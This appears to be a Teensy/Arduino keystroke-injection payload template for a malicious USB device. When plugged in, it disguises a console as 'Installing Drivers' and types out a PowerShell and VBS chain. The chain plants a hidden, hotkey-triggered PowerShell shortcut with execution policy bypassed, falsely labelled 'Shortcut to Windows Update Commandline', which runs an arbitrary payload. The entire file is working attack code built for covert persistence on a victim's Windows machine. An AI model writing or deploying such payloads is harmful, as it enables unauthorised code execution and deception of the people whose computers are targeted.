#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
 
  Keyboard.println("echo $wsl = New-Object -comObject WScript.Shell > %temp%\\dsct.ps1");
  Keyboard.println("echo $Pld = \" -WindowStyle hidden -ep bypass -nologo -noprofile -c INPUT0 \" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $Hky = \"INPUT1\" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $Icn = \"INPUT2\" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $OFile = \"INPUT3\" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct = $wsl.CreateShortcut($OFile) >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.TargetPath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.Description = \"Shortcut to Windows Update Commandline\" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.WindowStyle = 7 >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.Hotkey = $Hky >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.IconLocation = \"$Icn,0\" >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.Arguments = $Pld >> %temp%\\dsct.ps1");
  Keyboard.println("echo $sct.Save() >> %temp%\\dsct.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dsct.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dsct.ps1\"),0,true >> %temp%\\dsct.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dsct.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS